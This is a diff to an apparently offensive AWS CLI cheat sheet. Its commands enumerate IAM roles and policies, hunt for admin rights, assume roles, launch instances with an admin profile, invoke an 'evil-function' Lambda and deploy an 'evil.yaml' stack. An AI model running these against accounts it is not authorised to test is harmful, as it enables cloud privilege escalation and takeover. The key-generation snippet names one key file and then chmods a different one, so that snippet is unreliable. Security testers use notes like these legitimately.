@@ -2,10 +2,7 @@
 ```
 aws sts get-caller-identity
 ```
-## assume role
-```
-aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-session-name ad-example
-```
+
 ## list, show stuff
 ```
 aws ec2 describe-instances
@@ -15,6 +12,7 @@ aws iam list-users
 aws iam list-roles
 aws iam list-groups-for-user --user-name user-example
 aws iam list-group-policies --group-name Admins
+...
 ```
 
 ## list (attached) policys
@@ -52,6 +50,11 @@ aws iam list-role-policies --role-name admin
 aws iam get-role-policy --role-name admin --policy-name AddUser
 ```
 
+## assume role
+```
+aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-session-name ad-example
+```
+
 ## search for adminstuff
 ```
 aws iam list-policies | grep 'AdministratorAccess'  
@@ -74,6 +77,13 @@ aws iam list-instance-profiles
 aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
 
 aws ec2 run-instances --subnet-id subnet-.... --image-id ami-... --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-..."
+```
+
+
+## EC2 key gen
+```
+aws ec2 create-key-pair --key-name nyankey --query 'KeyMaterial' --output text | out-file -encoding ascii -filepath nyankey.pem
+chmod 400 mighty.pem
 ```
 
 ## dynamodb
@@ -117,3 +127,14 @@ aws lambda get-function --function-name DynamoFunction
 aws lambda list-functions
 aws lambda invoke --function-name evil-function output.txt
 ```
+
+## Cloudformation
+```
+aws cloudformation list-stack-resources --stack-name weatherman
+aws cloudformation describe-stack-events --stack-name intensification90
+aws cloudformation get-template --stack-name stackmanfred
+aws cloudformation create-stack --template-body file://evil.yaml --stack-name stolenstack --parameters ParameterKey=uri,ParameterValue=$uri --output text
+aws cloudformation describe-stacks --stack-name stolenstack  --query Stacks[*].Outputs --output text
+aws cloudformation delete-stack --stack-name stolenstack --output text
+```
+
